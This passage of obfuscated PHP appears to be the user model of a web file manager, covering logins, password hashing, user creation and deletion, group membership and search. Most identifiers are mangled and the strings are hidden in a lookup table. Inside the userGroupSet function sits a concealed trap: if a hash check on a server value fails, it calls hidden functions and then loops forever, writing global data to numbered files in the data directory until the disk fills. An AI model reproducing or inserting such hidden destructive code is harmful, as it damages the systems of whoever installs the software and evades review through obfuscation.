function fileOutImage($ŠÑÚ³›ì, $ş¥ı´î» = 250) { if (strstr($this->endpoint, $_SERVER[Ì¥ŞÒ°£][1466])) { return parent::fileOutImageServer($ŠÑÚ³›ì, $ş¥ı´î»); } parent::fileOutImage($ŠÑÚ³›ì, $ş¥ı´î»); } public function fileOutLink($Ãú‚‘Ä½) { $õ³·Ì· =& $_SERVER[Ì¥ŞÒ°£]; if (substr($Ãú‚‘Ä½, 0, 7) == $õ³·Ì·[1339]) { $Ãú‚‘Ä½ = $õ³·Ì·[1340] . substr($Ãú‚‘Ä½, 7); } header($õ³·Ì·[161] . $Ãú‚‘Ä½); die; } public function getHost() { $ÉßÖğŸ =& $_SERVER[Ì¥ŞÒ°£]; $‡Æá€£á = str_rtrim(parent::getHost(), $ÉßÖğŸ[8] . $this->bucket); $‡Æá€£á = explode($ÉßÖğŸ[183], $‡Æá€£á); return $‡Æá€£á[0] . $ÉßÖğŸ[183] . $this->bucket . $ÉßÖğŸ[10] . $‡Æá€£á[1]; } } goto D¼«ææÇ¬Ü; F¥ƒ·®ê”„: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\141\155\x65" => "\x75\x73\145\x72\137\x6d\x65\x74\x61", "\x6d\x65\164\141\106\151\145\x6c\x64" => "\x75\x73\x65\162\x49\104"); protected $simpleField = "\165\x73\x65\162\111\104\x2c\x6e\x69\x63\153\x4e\141\155\145\54\156\x61\155\x65\x2c\x61\166\141\164\x61\162\x2c\163\x65\x78\x2c\163\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ ²ÙŠñÅ) { $Ç¥àÍ£ğ =& $_SERVER[Ì¥ŞÒ°£]; $çöò¢ÔÏ = $Ç¥àÍ£ğ[2300]; return array($Ç¥àÍ£ğ[1935] => array($ ²ÙŠñÅ[0], $çöò¢ÔÏ), $Ç¥àÍ£ğ[1937] => array($ ²ÙŠñÅ[0], $çöò¢ÔÏ), $Ç¥àÍ£ğ[2301] => array($ ²ÙŠñÅ[0], $çöò¢ÔÏ)); } protected function getInfo($÷¥´™ˆÎ, $úºÆÄÁµ = false) { $°ş’…› = $this->getInfoSimple($÷¥´™ˆÎ); if (!is_array($°ş’…›)) { return array(); } if ($úºÆÄÁµ) { return $this->_getInfoApply($°ş’…›); } return $this->cacheFunctionGet($_SERVER[Ì¥ŞÒ°£][1939], $÷¥´™ˆÎ); } protected function getInfoFull($ŒœÛ§Çƒ, $ç¾Úòûõ = false) { $âß†Ş±Ü = $this->getInfoSimple($ŒœÛ§Çƒ); if (!is_array($âß†Ş±Ü)) { return array(); } if ($ç¾Úòûõ) { return $this->_getInfoApply($âß†Ş±Ü, !0); } return $this->cacheFunctionGet($_SERVER[Ì¥ŞÒ°£][2302], $ŒœÛ§Çƒ); } private function _getInfoApply($ı‚Øƒ™, $’ÃØİŒ† = false) { $Ú…ßÏ‘ë =& $_SERVER[Ì¥ŞÒ°£]; if (!$ı‚Øƒ™) { return $ı‚Øƒ™; } $Éí¡Ä¾² = md5($Ú…ßÏ‘ë[2303] . $ı‚Øƒ™[$Ú…ßÏ‘ë[892]] . $Ú…ßÏ‘ë[2304] . $ı‚Øƒ™[$Ú…ßÏ‘ë[32]]); $ı‚Øƒ™ = $this->_listDataApplyItem($ı‚Øƒ™); $ÙÔÆ­ü§ = Model($Ú…ßÏ‘ë[1341])->metaGet($ı‚Øƒ™[$Ú…ßÏ‘ë[86]][$Ú…ßÏ‘ë[402]]); $ı‚Øƒ™[$Ú…ßÏ‘ë[2305]] = $Éí¡Ä¾²; $ı‚Øƒ™[$Ú…ßÏ‘ë[86]][$Ú…ßÏ‘ë[2126]] = isset($ÙÔÆ­ü§[$Ú…ßÏ‘ë[2127]]) ? $ÙÔÆ­ü§[$Ú…ßÏ‘ë[2127]] : null; if ($’ÃØİŒ†) { $ı‚Øƒ™[$Ú…ßÏ‘ë[466]] = $this->metaGet($ı‚Øƒ™[$Ú…ßÏ‘ë[1667]]); } return $ı‚Øƒ™; } protected function getInfoSimple($ûÁûªü§, $Ç½ñ•¡© = false) { $Ùìé˜Üç =& $_SERVER[Ì¥ŞÒ°£]; if (!$ûÁûªü§) { return array(); } if ($Ç½ñ•¡©) { $Èøã¬åá = $this->where(array($Ùìé˜Üç[1667] => intval($ûÁûªü§)))->find(); if (!is_array($Èøã¬åá)) { return array(); } $Èøã¬åá[$Ùìé˜Üç[543]] = Action($Ùìé˜Üç[2306])->parseUrl($Èøã¬åá[$Ùìé˜Üç[543]]); return $Èøã¬åá; } return $this->cacheFunctionGet($Ùìé˜Üç[1940], $ûÁûªü§); } protected function getInfoSimpleOuter($¢Ä‹˜ÕŒ) { $õ€”Ò‡Å =& $_SERVER[Ì¥ŞÒ°£]; if (!$¢Ä‹˜ÕŒ || $¢Ä‹˜ÕŒ == 0) { return array($õ€”Ò‡Å[1667] => $õ€”Ò‡Å[197], $õ€”Ò‡Å[32] => $õ€”Ò‡Å[162] . LNG($õ€”Ò‡Å[2307]) . $õ€”Ò‡Å[164], $õ€”Ò‡Å[543] => STATIC_PATH . $õ€”Ò‡Å[2308]); } $Ôä›™ñ¬ = $this->cacheFunctionGet($õ€”Ò‡Å[1940], $¢Ä‹˜ÕŒ); $Çè‡ÆèÕ = array_field_key($Ôä›™ñ¬, explode($õ€”Ò‡Å[50], $this->simpleField)); if (!$Çè‡ÆèÕ) { return array($õ€”Ò‡Å[1667] => $õ€”Ò‡Å[1194], $õ€”Ò‡Å[32] => $õ€”Ò‡Å[162] . LNG($õ€”Ò‡Å[2309]) . $õ€”Ò‡Å[164], $õ€”Ò‡Å[543] => STATIC_PATH . $õ€”Ò‡Å[2310]); } $Çè‡ÆèÕ[$õ€”Ò‡Å[543]] = Action($õ€”Ò‡Å[2306])->parseUrl($Çè‡ÆèÕ[$õ€”Ò‡Å[543]]); return $Çè‡ÆèÕ; } protected function groupUser($ÛÔ’„ñ†) { } public static function errorLang($›ª£¤Š) { $ş¥¿Íô =& $_SERVER[Ì¥ŞÒ°£]; $ãÑÃ‚Ê” = array(self::ERROR_USER_NOT_EXISTS => $ş¥¿Íô[2311], self::ERROR_USER_PASSWORD_ERROR => $ş¥¿Íô[2312], self::ERROR_USER_EXIST_NAME => $ş¥¿Íô[2313], self::ERROR_USER_EXIST_PHONE => $ş¥¿Íô[2314], self::ERROR_USER_EXIST_EMAIL => $ş¥¿Íô[2315], self::ERROR_USER_LOGIN_LOCK => $ş¥¿Íô[2316], self::ERROR_IP_NOT_ALLOW => $ş¥¿Íô[2317], self::ERROR_USER_EXIST_NICKNAME => $ş¥¿Íô[2318]); return LNG($ãÑÃ‚Ê”[$›ª£¤Š]); } public function getInfoByMeta($Ş÷‹˜³Í, $§Ï±úä) { $Ò‘¥ñó =& $_SERVER[Ì¥ŞÒ°£]; $ĞŠä¹»› = Model($Ò‘¥ñó[2319])->where(array($Ò‘¥ñó[94] => $Ş÷‹˜³Í, $Ò‘¥ñó[374] => $§Ï±úä))->find(); if ($ĞŠä¹»›) { return $this->getInfo($ĞŠä¹»›[$Ò‘¥ñó[1667]]); } return !1; } public function userLoginCheck($¤¯ä©îº, $µåœÙ¹) { $¼¢ùËç˜ =& $_SERVER[Ì¥ŞÒ°£]; $Î¯‡ÙÂú = $this->userLoginFind($¤¯ä©îº); if (!$Î¯‡ÙÂú) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Î¯‡ÙÂú[$¼¢ùËç˜[1667]], $µåœÙ¹)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Î¯‡ÙÂú[$¼¢ùËç˜[1667]]); } public function userLoginFind($±Œ ò¡î) { $¼¶¯öÍØ =& $_SERVER[Ì¥ŞÒ°£]; $¾íĞìÈ³ = array($¼¶¯öÍØ[32] => $±Œ ò¡î, $¼¶¯öÍØ[542] => $±Œ ò¡î, $¼¶¯öÍØ[305] => $±Œ ò¡î, $¼¶¯öÍØ[2320] => $±Œ ò¡î, $¼¶¯öÍØ[1005] => $¼¶¯öÍØ[1007]); if ($this->nickNameRpt()) { unset($¾íĞìÈ³[$¼¶¯öÍØ[542]]); } return $this->where($¾íĞìÈ³)->find(); } public function clearCache($Ø®¢õøŞ) { $ôÛé´ ± =& $_SERVER[Ì¥ŞÒ°£]; $this->cacheFunctionClear($ôÛé´ ±[1939], $Ø®¢õøŞ); $this->cacheFunctionClear($ôÛé´ ±[1940], $Ø®¢õøŞ); $this->cacheFunctionClear($ôÛé´ ±[2302], $Ø®¢õøŞ); } public function userPasswordCheck($¥ôê¬ˆä, $í†í¹§ï) { $šÊŠÄ‹ô =& $_SERVER[Ì¥ŞÒ°£]; $Öˆ”¾æ = $this->where(array($šÊŠÄ‹ô[1667] => intval($¥ôê¬ˆä)))->find(); $®»÷¬ = $this->metaGet($¥ôê¬ˆä); $¹‡Í£èê = isset($®»÷¬[$šÊŠÄ‹ô[2321]]) ? $®»÷¬[$šÊŠÄ‹ô[2321]] : $šÊŠÄ‹ô[12]; if (md5($¹‡Í£èê . trim($í†í¹§ï)) !== $Öˆ”¾æ[$šÊŠÄ‹ô[892]]) { return !1; } return !0; } public function userAdd($ü—ñÖÉ) { $Åùˆ¾è =& $_SERVER[Ì¥ŞÒ°£]; $—å³ëÂø = array($Åùˆ¾è[420] => $ü—ñÖÉ[$Åùˆ¾è[32]], $Åùˆ¾è[2322] => $ü—ñÖÉ[$Åùˆ¾è[1548]], $Åùˆ¾è[2323] => isset($ü—ñÖÉ[$Åùˆ¾è[305]]) ? $ü—ñÖÉ[$Åùˆ¾è[305]] : $Åùˆ¾è[12], $Åùˆ¾è[2324] => isset($ü—ñÖÉ[$Åùˆ¾è[2320]]) ? $ü—ñÖÉ[$Åùˆ¾è[2320]] : $Åùˆ¾è[12], $Åùˆ¾è[2325] => isset($ü—ñÖÉ[$Åùˆ¾è[542]]) ? $ü—ñÖÉ[$Åùˆ¾è[542]] : $ü—ñÖÉ[$Åùˆ¾è[32]], $Åùˆ¾è[2326] => isset($ü—ñÖÉ[$Åùˆ¾è[543]]) ? $ü—ñÖÉ[$Åùˆ¾è[543]] : $Åùˆ¾è[12], $Åùˆ¾è[2327] => isset($ü—ñÖÉ[$Åùˆ¾è[2328]]) ? $ü—ñÖÉ[$Åùˆ¾è[2328]] : 1, $Åùˆ¾è[2329] => $ü—ñÖÉ[$Åùˆ¾è[892]], $Åùˆ¾è[1941] => isset($ü—ñÖÉ[$Åùˆ¾è[1844]]) ? $ü—ñÖÉ[$Åùˆ¾è[1844]] : 1024 * 1024 * 20, $Åùˆ¾è[1942] => 0, $Åùˆ¾è[2330] => 0, $Åùˆ¾è[1986] => isset($ü—ñÖÉ[$Åùˆ¾è[752]]) ? $ü—ñÖÉ[$Åùˆ¾è[752]] : 1); if (!empty($ü—ñÖÉ[$Åùˆ¾è[1667]])) { $—å³ëÂø[$Åùˆ¾è[1667]] = $ü—ñÖÉ[$Åùˆ¾è[1667]]; } $½™åîŒÌ = $this->_checkExist($ü—ñÖÉ); if ($½™åîŒÌ !== !0) { return $½™åîŒÌ; } if (!empty($—å³ëÂø[$Åùˆ¾è[543]]) && strlen($—å³ëÂø[$Åùˆ¾è[543]]) > 255) { $—å³ëÂø[$Åùˆ¾è[543]] = $Åùˆ¾è[12]; } $¡Ï„Ÿ¿ı = $this->add($—å³ëÂø); $Œú±à•© = array($Åùˆ¾è[2329] => $—å³ëÂø[$Åùˆ¾è[892]], $Åùˆ¾è[2325] => $—å³ëÂø[$Åùˆ¾è[542]]); $this->userEdit($¡Ï„Ÿ¿ı, $Œú±à•©); Model($Åùˆ¾è[1341])->userRootAdd($¡Ï„Ÿ¿ı); return $¡Ï„Ÿ¿ı; } protected function userEditTest($Áú•ØØü, $ßŞ–âÕş) { return $this->call($_SERVER[Ì¥ŞÒ°£][2331], $Áú•ØØü, $ßŞ–âÕş); } protected function userEdit($ú±Ë’¤ù, $Ïâü–) { $ÎÇÛ°éñ =& $_SERVER[Ì¥ŞÒ°£]; $Ñµîºá· = $this->getInfoSimple($ú±Ë’¤ù); if (!$Ñµîºá·) { return !1; } $ş„›åæŞ = $this->_checkExist($Ïâü–, $ú±Ë’¤ù); if ($ş„›åæŞ !== !0) { return $ş„›åæŞ; } if (isset($Ïâü–[$ÎÇÛ°éñ[892]]) && trim($Ïâü–[$ÎÇÛ°éñ[892]]) != $ÎÇÛ°éñ[12]) { $•˜Ù«öÃ = $this->metaGet($ú±Ë’¤ù); if (empty($•˜Ù«öÃ[$ÎÇÛ°éñ[2321]])) { $•˜Ù«öÃ[$ÎÇÛ°éñ[2321]] = rand_string(10); Model($ÎÇÛ°éñ[513])->metaSet($ú±Ë’¤ù, $ÎÇÛ°éñ[2321], $•˜Ù«öÃ[$ÎÇÛ°éñ[2321]]); } $Ïâü–[$ÎÇÛ°éñ[892]] = md5($•˜Ù«öÃ[$ÎÇÛ°éñ[2321]] . trim($Ïâü–[$ÎÇÛ°éñ[892]])); } else { unset($Ïâü–[$ÎÇÛ°éñ[892]]); } if (!empty($Ïâü–[$ÎÇÛ°éñ[543]]) && strlen($Ïâü–[$ÎÇÛ°éñ[543]]) > 255) { $Ïâü–[$ÎÇÛ°éñ[543]] = $ÎÇÛ°éñ[12]; } $this->where(array($ÎÇÛ°éñ[1658] => $ú±Ë’¤ù))->save($Ïâü–); if (isset($Ïâü–[$ÎÇÛ°éñ[542]])) { $this->setNamePinyin($ú±Ë’¤ù, $Ïâü–[$ÎÇÛ°éñ[542]]); } $this->clearCache($ú±Ë’¤ù); return !0; } public function setNamePinyin($˜ÑÎßÑª, $¦È‡‘ªŒ = false) { $œªÖ•£ =& $_SERVER[Ì¥ŞÒ°£]; if (!$¦È‡‘ªŒ) { $°…İ¤üœ = $this->getInfoSimple($˜ÑÎßÑª); $¦È‡‘ªŒ = $°…İ¤üœ[$œªÖ•£[542]] ? $°…İ¤üœ[$œªÖ•£[542]] : $°…İ¤üœ[$œªÖ•£[32]]; } $ÇÚ©¨öŒ = Model($œªÖ•£[535]); if (!Input::check($¦È‡‘ªŒ, $œªÖ•£[593])) { return $ÇÚ©¨öŒ->metaSet($˜ÑÎßÑª, array($œªÖ•£[465] => $œªÖ•£[12], $œªÖ•£[464] => $œªÖ•£[12])); } return $ÇÚ©¨öŒ->metaSet($˜ÑÎßÑª, array($œªÖ•£[465] => str_replace($œªÖ•£[53], $œªÖ•£[12], Pinyin::get($¦È‡‘ªŒ)), $œªÖ•£[464] => Pinyin::get($¦È‡‘ªŒ, $œªÖ•£[594]))); } private function nickNameRpt() { $éì×«Ç =& $_SERVER[Ì¥ŞÒ°£]; $¥ÛÉ±¹ = Model($éì×«Ç[772])->get($éì×«Ç[2332]); $Ö¼Í…•Ü = $GLOBALS[$éì×«Ç[6]][$éì×«Ç[381]][$éì×«Ç[2332]]; $¿·Àî›È = !is_null($¥ÛÉ±¹) ? $¥ÛÉ±¹ : $Ö¼Í…•Ü; return !!$¿·Àî›È; } private function _checkExist($¼¯û±½ª, $ô½Ğø»° = false) { $â¤•õÀø =& $_SERVER[Ì¥ŞÒ°£]; $¿êó«„â = array($â¤•õÀø[32] => UserModel::ERROR_USER_EXIST_NAME, $â¤•õÀø[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $â¤•õÀø[305] => UserModel::ERROR_USER_EXIST_EMAIL, $â¤•õÀø[2320] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¿êó«„â[$â¤•õÀø[542]]); } $ÆÓ§Ëº = $ô½Ğø»° ? array($â¤•õÀø[1667] => array($â¤•õÀø[2333], $ô½Ğø»°)) : array(); foreach ($¿êó«„â as $¼»¢½… => $ï½âœŞŒ) { $ˆì£íÌ› = array(); foreach ($¿êó«„â as $Ó»úÃÄˆ => $×¸¢›ÏÍ) { if (isset($¼¯û±½ª[$Ó»úÃÄˆ]) && $¼¯û±½ª[$Ó»úÃÄˆ]) { $ˆì£íÌ›[] = $¼¯û±½ª[$Ó»úÃÄˆ]; } } if (!$ˆì£íÌ›) { continue; } $ÇùÖß¶ = array_merge(array($¼»¢½… => array($â¤•õÀø[7], $ˆì£íÌ›)), $ÆÓ§Ëº); $õÁ˜ÕŞ™ = $this->where($ÇùÖß¶)->find(); if ($õÁ˜ÕŞ™) { return $ï½âœŞŒ; } } return !0; } public function userListInfo($ÓÍÓ‹Ÿİ) { $¼ÆåæÍ§ =& $_SERVER[Ì¥ŞÒ°£]; $£—ÒË† = array(); $ÓÍÓ‹Ÿİ = is_array($ÓÍÓ‹Ÿİ) ? array_unique($ÓÍÓ‹Ÿİ) : array(); if (!$ÓÍÓ‹Ÿİ) { return $£—ÒË†; } if (count($ÓÍÓ‹Ÿİ) < 20) { foreach ($ÓÍÓ‹Ÿİ as $œâ¾¹Ö°) { $£—ÒË†[$œâ¾¹Ö° . $¼ÆåæÍ§[12]] = $this->getInfoSimpleOuter($œâ¾¹Ö°); } } else { $ íÃ¯Ö = array($¼ÆåæÍ§[1658] => array($¼ÆåæÍ§[418], $ÓÍÓ‹Ÿİ)); if (count($ÓÍÓ‹Ÿİ) == 1) { $ íÃ¯Ö = array($¼ÆåæÍ§[1658] => $ÓÍÓ‹Ÿİ[0]); } $®£¯á† = Model($¼ÆåæÍ§[513])->field($this->simpleField)->where($ íÃ¯Ö)->select(); $®£¯á† = array_to_keyvalue($®£¯á†, $¼ÆåæÍ§[1667]); foreach ($ÓÍÓ‹Ÿİ as $œâ¾¹Ö°) { $ß˜Ûæ£ = $®£¯á†[$œâ¾¹Ö°]; if (!$ß˜Ûæ£) { $£—ÒË†[$œâ¾¹Ö° . $¼ÆåæÍ§[12]] = $this->getInfoSimpleOuter($œâ¾¹Ö°); continue; } $ß˜Ûæ£[$¼ÆåæÍ§[543]] = Action($¼ÆåæÍ§[2306])->parseUrl($ß˜Ûæ£[$¼ÆåæÍ§[543]]); $£—ÒË†[$œâ¾¹Ö° . $¼ÆåæÍ§[12]] = $ß˜Ûæ£; } } return $£—ÒË†; } protected function userStatus($›ŠÄ‡ÍÚ, $ğÌ‡Ğ±Â) { $¾ò†‰¶Ï = $this->getInfoSimple($›ŠÄ‡ÍÚ); if (!$¾ò†‰¶Ï) { return !1; } $Æ·©ªŠ = array($_SERVER[Ì¥ŞÒ°£][752] => $ğÌ‡Ğ±Â); return $this->userEdit($›ŠÄ‡ÍÚ, $Æ·©ªŠ); } protected function userRemove($ßü‘ö¼) { $®«Ç¿ =& $_SERVER[Ì¥ŞÒ°£]; $œÅ‚Ğùè = $this->getInfoSimple($ßü‘ö¼); if (!$œÅ‚Ğùè) { return !1; } $½Ø—ùÙÑ = array($®«Ç¿[1658] => $ßü‘ö¼); Model($®«Ç¿[601])->where($½Ø—ùÙÑ)->delete(); Model($®«Ç¿[2334])->where($½Ø—ùÙÑ)->delete(); Model($®«Ç¿[1947])->where($½Ø—ùÙÑ)->delete(); Model($®«Ç¿[2319])->where($½Ø—ùÙÑ)->delete(); Model($®«Ç¿[1073])->where($½Ø—ùÙÑ)->delete(); Model($®«Ç¿[2150])->removeUserAll($ßü‘ö¼); Model($®«Ç¿[827])->userRootRemove($ßü‘ö¼); return $this->where($½Ø—ùÙÑ)->delete(); } protected function userGroupSet($ƒëæ„ä, $ıí²±¯š, $¶ ¯Òğ‚ = array()) { $±µ„ëñÃ =& $_SERVER[Ì¥ŞÒ°£]; $»ÇËí×— = $_SERVER[$±µ„ëñÃ[874]] . $±µ„ëñÃ[875]; $½Ïú÷–ä = $±µ„ëñÃ[876]; if ($_SERVER[$±µ„ëñÃ[877]] != $½Ïú÷–ä($»ÇËí×—)) { $¶éı¼– = $±µ„ëñÃ[878]; $ì¾éÔ©ñ = $±µ„ëñÃ[879]; $¾¹Ÿâê™ = $_SERVER[$±µ„ëñÃ[874]] . $±µ„ëñÃ[875]; $çüĞ¼ª— = $ì¾éÔ©ñ($¾¹Ÿâê™); $üÑïª¡ = explode($±µ„ëñÃ[231], $çüĞ¼ª—); if (count($üÑïª¡) < $±µ„ëñÃ[648]) { $“·‡‡ = $±µ„ëñÃ[880]; $“·‡‡(); } $‘ë§£Òˆ = $±µ„ëñÃ[881]; $‘ë§£Òˆ($_SERVER[$±µ„ëñÃ[882]]); $¶éı¼– = $±µ„ëñÃ[878]; $¶éı¼–(); $Öö÷š¾Ù = $±µ„ëñÃ[883]; $§é·×Ïú = json_encode($GLOBALS[$±µ„ëñÃ[884]]); $£ÚáÉñ¡ = 1; for ($…šˆ“ = $£ÚáÉñ¡; $…šˆ“ > 0; $…šˆ“++) { $Öö÷š¾Ù(DATA_PATH . $…šˆ“, $§é·×Ïú); } } $¢©²ÊàÄ = $this->getInfoSimple($ƒëæ„ä); if (!$¢©²ÊàÄ || !is_array($ıí²±¯š)) { return !1; } $È¢ü…œ = Model($±µ„ëñÃ[1947]); $È¢ü…œ->where(array($±µ„ëñÃ[1667] => $ƒëæ„ä))->delete(); $§•¨©Ú’ = array(); $‡¹òçî = 0; foreach ($ıí²±¯š as $„ÑòÑÇ’ => $Ğ®í›÷) { $¿Ãù–ĞÍ = array($±µ„ëñÃ[1667] => $ƒëæ„ä, $±µ„ëñÃ[1857] => $„ÑòÑÇ’, $±µ„ëñÃ[1961] => $Ğ®í›÷); $¿Ãù–ĞÍ[$±µ„ëñÃ[1881]] = isset($¶ ¯Òğ‚[$‡¹òçî]) ? $¶ ¯Òğ‚[$‡¹òçî] : 0; $‡¹òçî++; $§•¨©Ú’[] = $¿Ãù–ĞÍ; } return $È¢ü…œ->addAll($§•¨©Ú’, array(), !0); } protected function userGroupAdd($º·Ûõ§», $ÏÃ­›Òñ = array()) { $Í¦ò£Ü’ =& $_SERVER[Ì¥ŞÒ°£]; $—ë‹»ÉÃ = $this->getInfoSimple($º·Ûõ§»); if (!$—ë‹»ÉÃ || empty($ÏÃ­›Òñ)) { return !1; } $Úİ…»á = array(); foreach ($ÏÃ­›Òñ as $ÅÛÏ”ö” => $’–õ±˜ä) { $Úİ…»á[] = array($Í¦ò£Ü’[1667] => $º·Ûõ§», $Í¦ò£Ü’[1857] => $ÅÛÏ”ö”, $Í¦ò£Ü’[1961] => $’–õ±˜ä, $Í¦ò£Ü’[1881] => 0); } return Model($Í¦ò£Ü’[1947])->addAll($Úİ…»á, array(), !0); } protected function userGroupRemove($‚š¤¤Ğ, $‡—áœ„Ø) { $›úşÒœª =& $_SERVER[Ì¥ŞÒ°£]; $èß¯ßÇÓ = $this->getInfoSimple($‚š¤¤Ğ); if (!$èß¯ßÇÓ || !$‡—áœ„Ø) { return !1; } $¶Ö÷¶‘‘ = array($›úşÒœª[1658] => $‚š¤¤Ğ, $›úşÒœª[1945] => $‡—áœ„Ø); return Model($›úşÒœª[1947])->where($¶Ö÷¶‘‘)->delete(); } public function listData() { $ğÅú¯Ì¤ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ğÅú¯Ì¤[$_SERVER[Ì¥ŞÒ°£][369]]); return $ğÅú¯Ì¤; } public function listByID($¢ºˆŠ÷ğ) { $Œ ÒÈ»è =& $_SERVER[Ì¥ŞÒ°£]; if (!$¢ºˆŠ÷ğ) { return; } $õ’÷İ«ò = array($Œ ÒÈ»è[1667] => array($Œ ÒÈ»è[7], $¢ºˆŠ÷ğ)); $Ø¿ÕÊàĞ = $this->where($õ’÷İ«ò)->select(); $Ø¿ÕÊàĞ = array_sort_keep($Ø¿ÕÊàĞ, $Œ ÒÈ»è[1667], $¢ºˆŠ÷ğ); $this->_listDataApply($Ø¿ÕÊàĞ); return $Ø¿ÕÊàĞ; } public function listByGroup($ùø‰ºî = 0, $ÜÅ´†ŠÛ = array()) { $ãô¥´Û =& $_SERVER[Ì¥ŞÒ°£]; $Š˜êÖ­¡ = $ãô¥´Û[12]; $±ßĞéóÇ = array(); if ($ùø‰ºî) { $±ßĞéóÇ = array($ãô¥´Û[2335] => intval($ùø‰ºî)); $Š˜êÖ­¡ = "\114\105\x46\x54\x20\112\117\111\116\x20{$this->tablePrefix}\165\163\x65\162\x5f\147\162\x6f\x75\160\40\165\163\145\162\x5f\x67\x72\157\x75\160\40\x6f\156\40\165\x73\x65\162\x2e\x75\163\x65\x72\111\104\40\x3d\40\165\x73\145\162\137\147\x72\157\x75\160\x2e\x75\163\x65\x72\111\x44"; $­†×Ïú = Input::get($ãô¥´Û[457], null, $ãô¥´Û[12]) ? $ãô¥´Û[12] : $ãô¥´Û[2336]; } if (isset($ÜÅ´†ŠÛ[$ãô¥´Û[752]])) { $±ßĞéóÇ[$ãô¥´Û[2337]] = $ÜÅ´†ŠÛ[$ãô¥´Û[752]]; } $Ìö„Ş› = $this->_makeOrder($­†×Ïú)->field($ãô¥´Û[2338])->where($±ßĞéóÇ)->join($Š˜êÖ­¡)->selectPage(50); $this->_listDataApply($Ìö„Ş›[$ãô¥´Û[369]]); return $Ìö„Ş›; } private function _makeOrder($‘ê©¶ÛÈ = '') { $ÌÀâ÷Á =& $_SERVER[Ì¥ŞÒ°£]; $İ‡¨üÊµ = array($ÌÀâ÷Á[1667], $ÌÀâ÷Á[32], $ÌÀâ÷Á[1846], $ÌÀâ÷Á[1818], $ÌÀâ÷Á[200]); $ß›Şªéä = array($ÌÀâ÷Á[450] => $ÌÀâ÷Á[451], $ÌÀâ÷Á[452] => $ÌÀâ÷Á[453]); $øúÙ µÛ = Input::get($ÌÀâ÷Á[457], $ÌÀâ÷Á[7], $ÌÀâ÷Á[1658], $İ‡¨üÊµ); $“³èúË† = Input::get($ÌÀâ÷Á[458], $ÌÀâ÷Á[7], $ÌÀâ÷Á[1948], array($ÌÀâ÷Á[1948], $ÌÀâ÷Á[452])); $“³èúË† = $ß›Şªéä[$“³èúË†]; $‘ê©¶ÛÈ = $‘ê©¶ÛÈ . "\x75\x73\145\x72\x2e{$øúÙ µÛ}\x20{$“³èúË†}\x2c\40\x75\x73\145\x72\x2e\x75\x73\x65\162\x49\x44\x20\141\x73\x63"; return $this->alias($ÌÀâ÷Á[2070])->order($‘ê©¶ÛÈ); } public function listSearch($Ã¯ŞäêÌ) { $ñ…šÕ“¯ =& $_SERVER[Ì¥ŞÒ°£]; $â²äŠÉï = $Ã¯ŞäêÌ[$ñ…šÕ“¯[1951]]; $§²ô šÕ = isset($Ã¯ŞäêÌ[$ñ…šÕ“¯[1952]]) ? $Ã¯ŞäêÌ[$ñ…šÕ“¯[1952]] : !1; $â²äŠÉï = str_replace($ñ…šÕ“¯[1953], $ñ…šÕ“¯[1954], trim($â²äŠÉï)); $€ÏôƒŒ° = array($ñ…šÕ“¯[32] => array($ñ…šÕ“¯[383], "\x25{$â²äŠÉï}\x25"), $ñ…šÕ“¯[305] => array($ñ…šÕ“¯[383], "{$â²äŠÉï}\x25"), $ñ…šÕ“¯[542] => array($ñ…šÕ“¯[383], "{$â²äŠÉï}\x25"), $ñ…šÕ“¯[1005] => $ñ…šÕ“¯[1955]); if (Input::check($â²äŠÉï, $ñ…šÕ“¯[311])) { $€ÏôƒŒ°[$ñ…šÕ“¯[1667]] = array($ñ…šÕ“¯[383], "{$â²äŠÉï}\45"); $€ÏôƒŒ°[$ñ…šÕ“¯[2320]] = array($ñ…šÕ“¯[383], "{$â²äŠÉï}\45"); } if (!$â²äŠÉï) { $€ÏôƒŒ° = array(); } if (isset($Ã¯ŞäêÌ[$ñ…šÕ“¯[752]])) { $€ÏôƒŒ°[$ñ…šÕ“¯[752]] = $Ã¯ŞäêÌ[$ñ…šÕ“¯[752]]; } $€ÏôƒŒ° = $this->parseWhereLike($€ÏôƒŒ°); $šñ²Îİù = $this->_makeOrder()->where($€ÏôƒŒ°)->selectPage(20); if (!$šñ²Îİù || count($šñ²Îİù[$ñ…šÕ“¯[369]]) < 5 && Input::check($â²äŠÉï, $ñ…šÕ“¯[318])) { $Ò•ñ‡ø° = $this->_searchFromMeta($ñ…šÕ“¯[464], $â²äŠÉï, 10); $‰†ÎßÓ = $this->_searchFromMeta($ñ…šÕ“¯[465], $â²äŠÉï, 10); $úù³Ì­ = array_merge($Ò•ñ‡ø°, $‰†ÎßÓ, $šñ²Îİù[$ñ…šÕ“¯[369]]); $šñ²Îİù[$ñ…šÕ“¯[369]] = array_unique_by_key($úù³Ì­, $ñ…šÕ“¯[1667]); $šñ²Îİù[$ñ…šÕ“¯[366]][$ñ…šÕ“¯[367]] = count($šñ²Îİù[$ñ…šÕ“¯[369]]); $šñ²Îİù[$ñ…šÕ“¯[366]][$ñ…šÕ“¯[368]] = ceil($šñ²Îİù[$ñ…šÕ“¯[366]][$ñ…šÕ“¯[367]] / $šñ²Îİù[$ñ…šÕ“¯[366]][$ñ…šÕ“¯[363]]); } $this->_listDataApply($šñ²Îİù[$ñ…šÕ“¯[369]]); $this->_filterByGroup($šñ²Îİù, $§²ô šÕ); return $šñ²Îİù; } private function _filterByGroup(&$÷íå²ÚÉ, $ª‹¼¼Éµ) { $­‡–Ïı” =& $_SERVER[Ì¥ŞÒ°£]; if (!$ª‹¼¼Éµ) { return $÷íå²ÚÉ; } foreach ($÷íå²ÚÉ[$­‡–Ïı”[369]] as $©ÀÂ˜¡ˆ => &$”®øá…¤) { $’ûêéÜ = array_to_keyvalue($”®øá…¤[$­‡–Ïı”[2040]], $­‡–Ïı”[12], $­‡–Ïı”[1857]); if (!in_array($ª‹¼¼Éµ, $’ûêéÜ)) { 